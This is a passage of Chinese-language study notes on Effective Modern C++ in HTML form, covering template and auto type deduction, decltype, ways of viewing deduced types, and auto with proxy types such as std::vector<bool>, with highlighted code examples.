x=<span class="hljs-number">27</span>;                       <span class="hljs-comment">//如之前一样</span><span class="hljs-type">const</span> <span class="hljs-type">int</span> cx=x;                 <span class="hljs-comment">//如之前一样</span><span class="hljs-type">const</span> <span class="hljs-type">int</span> &amp; rx=cx;              <span class="hljs-comment">//如之前一样</span><span class="hljs-built_in">f</span>(x);                           <span class="hljs-comment">//x是左值，所以T是int&amp;，</span>                                <span class="hljs-comment">//param类型也是int&amp;</span><span class="hljs-built_in">f</span>(cx);                          <span class="hljs-comment">//cx是左值，所以T是const int&amp;，</span>                                <span class="hljs-comment">//param类型也是const int&amp;</span><span class="hljs-built_in">f</span>(rx);                          <span class="hljs-comment">//rx是左值，所以T是const int&amp;，</span>                                <span class="hljs-comment">//param类型也是const int&amp;</span><span class="hljs-built_in">f</span>(<span class="hljs-number">27</span>);                          <span class="hljs-comment">//27是右值，所以T是int，</span>                                <span class="hljs-comment">//param类型就是int&amp;&amp;</span></code></pre></div></div><p>如果你想从理论上理解这一部分的推导规则，可以参考条款28的引用折叠。</p><blockquote><p>C++不允许引用的引用。类型推导时多个引用撞到一起的时候（如<code>Widget&amp; &amp;&amp;</code>）如果任一引用为左值引用，则结果为左值引用。否则（即，如果引用都是右值引用），结果为右值引用。</p></blockquote><p>你也可以直接从感性的角度理解：</p><p>首先看<code>ParamType</code>，通用引用之所以叫通用，就是它遇到左值变左值，遇到右值变右值。又因为本质是引用，常量性得到保留。</p><p>再看<code>T</code>。这是模板类型推导中唯一一种<code>T</code>被推导为引用的情况，而且传入左值的时候推导为引用，右值推导为值。这使得<code>T</code>本身可以保留传入变量是否为右值的信息，从而可以通过<code>std::forward</code>进行有条件的转换。</p><blockquote><p><code>std::forward</code>的行为是，如果原始对象是右值，可以将其移动到返回值中（避免拷贝开销），但是如果原始对象是左值，必须创建副本。详见条款23和条款25。</p></blockquote><p>可以看到，这一部分耦合了C++中移动语义的具体实现。不过后面也将会看到，这些概念也都是相互配套使用的，以达到移动语义潜在的性能优势。</p><h3 id="特例数组和函数实参">特例：数组和函数实参</h3><blockquote><p>这一部分更像是冷知识，对这部分语法感兴趣可以看看，不看也不影响理解。</p></blockquote><p>我们知道，C++中数组可以退化为指针，比如可以将<code>const char []</code>类型的数组赋值给一个<code>const char *</code>。</p><p>对于传值形参模版：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-3yo6mllmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-3yo6mllmyir35t"><pre><code class="hljs cpp"><span class="hljs-type">const</span> <span class="hljs-type">char</span> name[] = <span class="hljs-string">"J. P. Briggs"</span>;     <span class="hljs-comment">//name的类型是const char[13]</span><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">f</span><span class="hljs-params">(T param)</span></span>;                        <span class="hljs-comment">//传值形参的模板</span><span class="hljs-built_in">f</span>(name);                                <span class="hljs-comment">//T和param会推导成什么类型?</span></code></pre></div></div><p><code>T</code>被推导为<code>const char*</code>。</p><p>因为在C语言中，数组与指针形参是完全等价的，C++又保持了和C的兼容性。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-gpqe0xlmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-gpqe0xlmyir35t"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">myFunc</span><span class="hljs-params">(<span class="hljs-type">int</span> param[])</span></span>;<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">myFunc</span><span class="hljs-params">(<span class="hljs-type">int</span>* param)</span></span>;                <span class="hljs-comment">//与上面相同的函数</span></code></pre></div></div><p>但引用是C++的东西。虽然函数不能声明形参为真正的数组，但是<strong>可以</strong>接受指向数组的<strong>引用</strong>。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-36iphslmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-36iphslmyir35t"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">f</span><span class="hljs-params">(T&amp; param)</span></span>;                       <span class="hljs-comment">//传引用形参的模板</span></code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-k8ooizlmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-k8ooizlmyir35t"><pre><code class="hljs cpp"><span class="hljs-built_in">f</span>(name);                                <span class="hljs-comment">//T被推导为const char[13]</span></code></pre></div></div><p><code>f</code>的实参类型为<code>const char (&amp;)[13]</code>。</p><blockquote><p>是的，这种语法看起来简直有毒，但是知道它将会让你在关心这些问题的人的提问中获得<strong>大</strong>神的称号。</p><p>有趣的是，可声明指向数组的引用的能力，使得我们可以创建一个模板函数来推导出数组的大小：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-j7z43dlmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-j7z43dlmyir35t"><pre><code class="hljs cpp"><span class="hljs-comment">//在编译期间返回一个数组大小的常量值（//数组形参没有名字，</span><span class="hljs-comment">//因为我们只关心数组的大小）</span><span class="hljs-comment">//constexpr使得结果在编译期间可用</span><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T, std::<span class="hljs-type">size_t</span> N&gt;</span><span class="hljs-function"><span class="hljs-keyword">constexpr</span> std::<span class="hljs-type">size_t</span> <span class="hljs-title">arraySize</span><span class="hljs-params">(T (&amp;)[N])</span> <span class="hljs-keyword">noexcept</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">return</span> N;}</code></pre></div></div><p>可以这样用：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-xvdzt3lmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-xvdzt3lmyir35t"><pre><code class="hljs cpp"><span class="hljs-type">int</span> keyVals[] = { <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">11</span>, <span class="hljs-number">22</span>, <span class="hljs-number">35</span> };             <span class="hljs-comment">//keyVals有七个元素</span><span class="hljs-type">int</span> mappedVals[<span class="hljs-built_in">arraySize</span>(keyVals)];                     <span class="hljs-comment">//mappedVals也有七个</span>std::array&lt;<span class="hljs-type">int</span>, arraySize(keyVals)&gt; mappedVals;         <span class="hljs-comment">//mappedVals的大小为7</span></code></pre></div></div></blockquote><p>对于函数上面的讨论依旧是一样的，传值时，函数退化成函数指针，传引用是变成函数指针的引用。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-gk6g29lmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-gk6g29lmyir35t"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">someFunc</span><span class="hljs-params">(<span class="hljs-type">int</span>, <span class="hljs-type">double</span>)</span></span>;         <span class="hljs-comment">//someFunc是一个函数，</span>                                    <span class="hljs-comment">//类型是void(int, double)</span><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">f1</span><span class="hljs-params">(T param)</span></span>;                   <span class="hljs-comment">//传值给f1</span><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">f2</span><span class="hljs-params">(T &amp; param)</span></span>;                 <span class="hljs-comment">//传引用给f2</span><span class="hljs-built_in">f1</span>(someFunc);                       <span class="hljs-comment">//param被推导为指向函数的指针，</span>                                    <span class="hljs-comment">//类型是void(*)(int, double)</span><span class="hljs-built_in">f2</span>(someFunc);                       <span class="hljs-comment">//param被推导为指向函数的引用，</span>                                    <span class="hljs-comment">//类型是void(&amp;)(int, double)</span></code></pre></div></div><h2 id="条款二理解auto类型推导">条款二：理解auto类型推导</h2><h3 id="推导规则">推导规则</h3><p>前面之所以详细的讲模版类型推导的规则，是因为<strong><code>auto</code>类型推导和模板类型推导有一个直接的映射关系。</strong></p><p>很可能看例子就明白了：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-oznqaqlmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-oznqaqlmyir35t"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> x = <span class="hljs-number">27</span>;<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> cx = x;<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp; rx=cx;</code></pre></div></div><p>分别对应于下面的模型：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-7l6x4dlmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-7l6x4dlmyir35t"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;            <span class="hljs-comment">//概念化的模板用来推导x的类型</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func_for_x</span><span class="hljs-params">(T param)</span></span>{      <span class="hljs-comment">//推导结果对应于param类型</span>    cout &lt;&lt; <span class="hljs-string">"deduced type: "</span>         &lt;&lt; <span class="hljs-built_in">type_id_with_cvr</span>&lt;<span class="hljs-keyword">decltype</span>(param)&gt;().<span class="hljs-built_in">pretty_name</span>()         &lt;&lt; <span class="hljs-string">'\n'</span>;}<span class="hljs-built_in">func_for_x</span>(<span class="hljs-number">27</span>);                 <span class="hljs-comment">//概念化调用：</span>                                <span class="hljs-comment">//param的推导类型是x的类型，int</span><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;            <span class="hljs-comment">//概念化的模板用来推导cx的类型</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func_for_cx</span><span class="hljs-params">(<span class="hljs-type">const</span> T param)</span></span>;<span class="hljs-built_in">func_for_cx</span>(x);                 <span class="hljs-comment">//概念化调用：</span>                                <span class="hljs-comment">//param的推导类型是cx的类型，const int</span><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;            <span class="hljs-comment">//概念化的模板用来推导rx的类型</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func_for_rx</span><span class="hljs-params">(<span class="hljs-type">const</span> T &amp; param)</span></span>;<span class="hljs-built_in">func_for_rx</span>(x);                 <span class="hljs-comment">//概念化调用：</span>                                <span class="hljs-comment">//param的推导类型是rx的类型，const int&amp;</span></code></pre></div></div><p><strong>对于<code>auto</code>的修饰对应于函数形参中对模板参数<code>T</code>的修饰，推导结果对应于函数形参<code>param</code>的推导结果。</strong></p><p>理解了其中的对应关系，便不难理解下面的结果。这一部分对应于条款1中通用引用的case。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-vcqps9lmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-vcqps9lmyir35t"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> x = <span class="hljs-number">27</span>;<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> cx = x;<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp; rx=cx;<span class="hljs-keyword">auto</span>&amp;&amp; uref1 = x;               <span class="hljs-comment">//x是int左值，</span>                                <span class="hljs-comment">//所以uref1类型为int&amp;</span><span class="hljs-keyword">auto</span>&amp;&amp; uref2 = cx;              <span class="hljs-comment">//cx是const int左值，</span>                                <span class="hljs-comment">//所以uref2类型为const int&amp;</span><span class="hljs-keyword">auto</span>&amp;&amp; uref3 = <span class="hljs-number">27</span>;              <span class="hljs-comment">//27是int右值，</span>                                <span class="hljs-comment">//所以uref3类型为int&amp;&amp;</span></code></pre></div></div><p>模版类型推导中关于数组和函数参数推导的特例也适用于<code>auto</code>。</p><h3 id="特例">特例</h3><p><code>auto</code>会假定用大括号括起的初始化表达式代表一个<code>std::initializer_list</code>，但模板类型推导不会。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-1fm7mjlmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-1fm7mjlmyir35t"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> x = { <span class="hljs-number">11</span>, <span class="hljs-number">23</span>, <span class="hljs-number">9</span> };         <span class="hljs-comment">//x的类型是std::initializer_list&lt;int&gt;</span><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;            <span class="hljs-comment">//带有与x的声明等价的</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">f</span><span class="hljs-params">(T param)</span></span>;                <span class="hljs-comment">//形参声明的模板</span><span class="hljs-built_in">f</span>({ <span class="hljs-number">11</span>, <span class="hljs-number">23</span>, <span class="hljs-number">9</span> });               <span class="hljs-comment">//错误！不能推导出T</span></code></pre></div></div><p>C++11添加了用于支持统一初始化（<strong>uniforminitialization</strong>）的语法，但是由于这个特性，统一初始化和<code>auto</code>混用的时候还是要非常谨慎。关于这个语法的详细内容可以参见条款7。</p><h2 id="条款三理解decltype">条款三：理解decltype</h2><h3 id="decltype基本用法">decltype基本用法</h3><p>通常情况下<code>decltype</code>只是简单的返回名字或者表达式的类型。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-6jewi8lmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-6jewi8lmyir35t"><pre><code class="hljs cpp"><span class="hljs-type">const</span> <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;                <span class="hljs-comment">//decltype(i)是const int</span><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">f</span><span class="hljs-params">(<span class="hljs-type">const</span> Widget&amp; w)</span></span>;        <span class="hljs-comment">//decltype(w)是const Widget&amp;</span>                                <span class="hljs-comment">//decltype(f)是bool(const Widget&amp;)</span><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Point</span>{    <span class="hljs-type">int</span> x,y;                    <span class="hljs-comment">//decltype(Point::x)是int</span>};                              <span class="hljs-comment">//decltype(Point::y)是int</span>vector&lt;<span class="hljs-type">int</span>&gt; v;                  <span class="hljs-comment">//decltype(v)是vector&lt;int&gt;</span></code></pre></div></div><p>一点都不奇怪。</p><p><code>decltype</code>最主要的用途就是<strong>用于声明函数模板，而这个函数返回类型依赖于形参类型</strong>。下面举例说明。</p><p>假定我们写一个函数，一个形参为容器，一个形参为索引值，这个函数支持使用方括号的方式（也就是使用“<code>[]</code>”）访问容器中指定索引值的数据，然后在返回索引操作的结果前执行认证用户操作。</p><p>首先需要了解，对一个<code>T</code>类型的容器使用<code>operator[]</code>通常会返回一个<code>T&amp;</code>对象，比如<code>std::deque</code>就是这样。</p><blockquote><p>但是<code>std::vector</code>有一个例外，对于<code>std::vector&lt;bool&gt;</code>，<code>operator[]</code>不会返回<code>bool&amp;</code>，它会返回一个全新的对象。它实际上是一个代理对象。后面条款6会在再次提到这个问题。当然，EffectiveSTL中也提到，尽量避免使用<code>vector&lt;bool&gt;</code>（条款18）。同时，也不应该期望写一个能适配所有容器的函数（条款2）。</p></blockquote><p>如果我们使用C++14，我们可能会写成这样：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-9rvr8clmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-9rvr8clmyir35t"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> Container, <span class="hljs-keyword">typename</span> Index&gt;    <span class="hljs-comment">//C++14版本，</span><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">authAndAccess</span><span class="hljs-params">(Container&amp; c, Index i)</span>       <span class="hljs-comment">//不那么正确</span></span><span class="hljs-function"></span>{    <span class="hljs-built_in">authenticateUser</span>();    <span class="hljs-keyword">return</span> c[i];                                <span class="hljs-comment">//从c[i]中推导返回类型</span>}</code></pre></div></div><p>C++14扩展到允许自动推导所有的<em>lambda</em>表达式和函数，甚至它们内含多条语句。但是，这里的问题是，尽管<code>operator[]</code>对于大多数<code>T</code>类型的容器会返回一个<code>T&amp;</code>，但<strong>函数的返回值是值传递</strong>，按照模版类型推导规则（条款1case1），引用会被忽略。所以最终还是返回了右值。我们事实上期望的是和直接调用<code>operator[]</code>的行为一样，返回一个左值的引用。</p><p>我们这时应当使用<code>decltype</code>。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-zntqx8lmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-zntqx8lmyir35t"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> Container, <span class="hljs-keyword">typename</span> Index&gt;</span><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">authAndAccess</span><span class="hljs-params">(Container&amp; c, Index i)</span></span><span class="hljs-function">    -&gt;<span class="hljs-title">decltype</span><span class="hljs-params">(c[i])</span></span><span class="hljs-function"></span>{    <span class="hljs-built_in">authenticateUser</span>();    <span class="hljs-keyword">return</span> c[i];}</code></pre></div></div><p>这时候<code>decltype(c[i])</code>忠实的推导出我们想要返回的是<code>T&amp;</code>。</p><blockquote><p>函数名称前面的<code>auto</code>不会做任何的类型推导工作。相反的，他只是暗示使用了C++11的<strong>尾置返回类型</strong>语法，即在函数形参列表后面使用一个”<code>-&gt;</code>“符号指出函数的返回类型，尾置返回类型的好处是我们可以在函数返回类型中使用函数形参相关的信息。</p></blockquote><h3 id="decltypeauto">decltype(auto)</h3><p>在C++14中也可以用<code>decltype(auto)</code>进行简化。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-5oqikylmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-5oqikylmyir35t"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> Container, <span class="hljs-keyword">typename</span> Index&gt;</span><span class="hljs-function"><span class="hljs-keyword">decltype</span>(<span class="hljs-keyword">auto</span>)</span><span class="hljs-function"><span class="hljs-title">authAndAccess</span><span class="hljs-params">(Container&amp; c, Index i)</span></span><span class="hljs-function"></span>{    <span class="hljs-built_in">authenticateUser</span>();    <span class="hljs-keyword">return</span> c[i];}</code></pre></div></div><p>我们可以这样理解<code>decltype(auto)</code>：<code>auto</code>说明符表示这个类型将会被推导，<code>decltype</code>说明<code>decltype</code>的规则将会被用到这个推导过程中。</p><blockquote><p>上面的代码其实还有潜在的问题。如果传入的是一个右值容器，它是一个临时对象，那么它通常会在<code>authAndAccess</code>调用结束被销毁，但这时候却返回了指向其内部元素的引用，会造成未定义行为。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-x6b1stlmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-x6b1stlmyir35t"><pre><code class="hljs cpp"><span class="hljs-comment">//你应该早已知道返回临时变量的引用的危险性。</span><span class="hljs-function"><span class="hljs-type">int</span>&amp; <span class="hljs-title">getLocalVariable</span><span class="hljs-params">()</span> </span>{    <span class="hljs-type">int</span> x = <span class="hljs-number">10</span>;    <span class="hljs-keyword">return</span> x; <span class="hljs-comment">// x 在函数返回后销毁，但引用仍然存在</span>}<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{    <span class="hljs-type">int</span> a=<span class="hljs-built_in">getLocalVariable</span>();    std::cout&lt;&lt;a; <span class="hljs-comment">//未定义行为！</span>}</code></pre></div></div><p>至于这个例子，我们可能会这样调用：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-e0azhclmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-e0azhclmyir35t"><pre><code class="hljs cpp"><span class="hljs-function">std::deque&lt;std::string&gt; <span class="hljs-title">makeStringDeque</span><span class="hljs-params">()</span></span>;      <span class="hljs-comment">//工厂函数</span><span class="hljs-comment">//从makeStringDeque中获得第五个元素的拷贝并返回</span><span class="hljs-keyword">auto</span> s = <span class="hljs-built_in">authAndAccess</span>(<span class="hljs-built_in">makeStringDeque</span>(), <span class="hljs-number">5</span>);</code></pre></div></div><p>这就有问题。我们可以使用t通用引用和<code>std::forward</code>解决这个问题。这时传入左值容器返回左值，传入右值容器返回右值。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-3vv75ulmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-3vv75ulmyir35t"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> Container, <span class="hljs-keyword">typename</span> Index&gt;    <span class="hljs-comment">//最终的C++14版本</span><span class="hljs-function"><span class="hljs-keyword">decltype</span>(<span class="hljs-keyword">auto</span>)</span><span class="hljs-function"><span class="hljs-title">authAndAccess</span><span class="hljs-params">(Container&amp;&amp; c, Index i)</span></span><span class="hljs-function"></span>{    <span class="hljs-built_in">authenticateUser</span>();    <span class="hljs-keyword">return</span> std::forward&lt;Container&gt;(c)[i];}</code></pre></div></div></blockquote><p>当然，<code>decltype(auto)</code>的使用不仅仅局限于函数返回类型。当你想对初始化表达式使用<code>decltype</code>推导的规则，你也可以使用：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-dme4u8lmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-dme4u8lmyir35t"><pre><code class="hljs cpp">Widget w;<span class="hljs-type">const</span> Widget&amp; cw = w;<span class="hljs-keyword">auto</span> myWidget1 = cw;                    <span class="hljs-comment">//auto类型推导</span>                                        <span class="hljs-comment">//myWidget1的类型为Widget</span><span class="hljs-keyword">decltype</span>(<span class="hljs-keyword">auto</span>) myWidget2 = cw;          <span class="hljs-comment">//decltype类型推导</span>                                        <span class="hljs-comment">//myWidget2的类型是const Widget&amp;</span></code></pre></div></div><h3 id="特殊情况">特殊情况</h3><p>将<code>decltype</code>应用于<strong>单纯的变量名</strong>会产生该变量名的声明类型。虽然变量名都是左值表达式，但这不会影响<code>decltype</code>的行为。</p><p>但是比单纯的变量名更复杂的左值表达式，<code>decltype</code>保证报告的类型始终是左值引用。</p><p>从这种行为的原因上讲倒是没什么太奇怪的，因为大多数左值表达式的类型天生具备一个左值引用修饰符。</p><p>具体的：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-8olqealmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-8olqealmyir35t"><pre><code class="hljs cpp"><span class="hljs-type">int</span> x = <span class="hljs-number">0</span>;</code></pre></div></div><p><code>decltype(x)</code>为<code>int</code>，但<code>decltype((x))</code>却是<code>int&amp;</code>。用小括号覆盖一个名字可以改变<code>decltype</code>对于名字产生的结果。</p><p>所以当使用<code>decltype(auto)</code>的时候一定要加倍的小心。</p><h2 id="条款四掌握查看类型推导结果的方法">条款四：掌握查看类型推导结果的方法</h2><p>上面详细的介绍了关于类型</p><h3 id="ide-编辑器">IDE 编辑器</h3><p>编辑代码的时候获得类型推导的结果。</p><p><code>Clion</code>会显示，结果一般会比较准确。</p><h3 id="编译器诊断信息">编译器诊断信息</h3><p>在编译期间获得结果。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-gayrf5lmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-gayrf5lmyir35t"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;    <span class="hljs-comment">// 只声明 TD 而不定义</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">TD</span>;               <span class="hljs-comment">// TD 是 “类型显示类”（Type Displayer）的缩写</span>TD&lt;<span class="hljs-keyword">decltype</span>(x)&gt; xType;  <span class="hljs-comment">// 诱发包括 x 和 y 的类型的错误信息</span>TD&lt;<span class="hljs-keyword">decltype</span>(y)&gt; yType;</code></pre></div></div><p>如clang：<code>error: implicit instantiation of undefined template 'TD&lt;int&gt;'</code></p><h3 id="运行时输出">运行时输出</h3><p>在运行时获得结果。</p><p>针对某个对象调用<code>typeid</code>，可以得到一个<code>std::type_info</code>对象，其拥有一个成员函数<code>name</code>，该函数产生一个代表类型的C-style 的字符串。</p><p>但遗憾的是，不同编译器对于<code>std::type_info::name</code>的实现各不相同，无法保证完全可靠。并且按照标准，<code>std::type_info::name</code>中处理类型的方式和向函数模板按值传参一样，因此类型的引用性以及<code>const</code>和<code>volatile</code>限定符也将被忽略。</p><p>原书中介绍了 Boost.TypeIndex第三方库用于代替<code>typeid</code>：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-0kvze3lmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-0kvze3lmyir35t"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;boost/type_index.hpp&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">f</span><span class="hljs-params">(<span class="hljs-type">const</span> T&amp; param)</span> </span>{    <span class="hljs-keyword">using</span> std::cout;    <span class="hljs-keyword">using</span> boost::typeindex::type_id_with_cvr;    <span class="hljs-comment">// 显示 T 的类型</span>    cout &lt;&lt; <span class="hljs-string">"T =          "</span>         &lt;&lt; <span class="hljs-built_in">type_id_with_cvr</span>&lt;T&gt;().<span class="hljs-built_in">pretty_name</span>()         &lt;&lt; <span class="hljs-string">'\n'</span>;    <span class="hljs-comment">// 显示 param 的类型</span>    cout &lt;&lt; <span class="hljs-string">"param =          "</span>         &lt;&lt; <span class="hljs-built_in">type_id_with_cvr</span>&lt;<span class="hljs-keyword">decltype</span>(param)&gt;().<span class="hljs-built_in">pretty_name</span>()         &lt;&lt; <span class="hljs-string">'\n'</span>;    ...}</code></pre></div></div><h2 id="条款五优先选用-auto而非显式类型声明">条款五：优先选用auto，而非显式类型声明</h2><p><code>auto</code>不仅简短，可以在用于复杂类型时少敲几个字，而且也降低了出错的可能。</p><p>它可以避免一些移植性和效率性的问题，也使得重构更方便。</p><p>首先，<code>auto</code>必须要求初始化，声明不初始化本来就是坏文明。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-zsbtaklmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-zsbtaklmyir35t"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> x2;                        <span class="hljs-comment">//错误！必须要初始化</span></code></pre></div></div><p>再比如，对STL不那么了解的程序员可能会写出这样的代码：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-0x0j20lmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-0x0j20lmyir35t"><pre><code class="hljs cpp">std::unordered_map&lt;std::string, <span class="hljs-type">int</span>&gt; m;...<span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> std::pair&lt;std::string, <span class="hljs-type">int</span>&gt;&amp; p : m) {    ...}</code></pre></div></div><p><code>std::unordered_map</code>的键值部分是 <code>const</code>的（这在EffectiveSTL条款22也有所提及）。所以哈希表中的<code>std::pair</code>类型应为<code>std::pair&lt;const std::string, int&gt;</code>而非<code>std::pair&lt;std::string, int&gt;</code>，类型的不匹配会导致额外的临时对象被复制出来，降低了运行效率。</p><p>使用<code>auto</code>就可以轻松避免这种问题：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-cugdwtlmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-cugdwtlmyir35t"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; p : m) {    ...}</code></pre></div></div><h2 id="条款六auto推导若非己愿使用显式类型初始化惯用法">条款六：auto推导若非己愿，使用显式类型初始化惯用法</h2><p>“隐形” 的代理类型可以导致<code>auto</code>根据初始化表达式推导出“错误的” 类型，应该防止写出这样的代码：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-tn8hpylmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-tn8hpylmyir35t"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> someVar = <span class="hljs-string">" 隐形 "</span> 代理类型表达式;</code></pre></div></div><p>一个隐形代理类的典型例子是<code>std::vector&lt;bool&gt;</code>，它经过了特化，与一般的<code>std::vector</code>的行为不同，和<code>std::bitset</code>的行为相似，使用一种压缩形式表示其持有的<code>bool</code>元素，每个<code>bool</code>元素用一个比特来表示。因此，<code>std::vector&lt;bool&gt;</code>的<code>operator[]</code>并不会直接返回一个<code>bool&amp;</code>，而是会返回一个具有类似行为的<code>std::vector&lt;bool&gt;::reference</code>类型的对象，并可以隐式转换为<code>bool</code>类型。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-clpkkalmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-clpkkalmyir35t"><pre><code class="hljs cpp"><span class="hljs-function">std::vector&lt;<span class="hljs-type">bool</span>&gt; <span 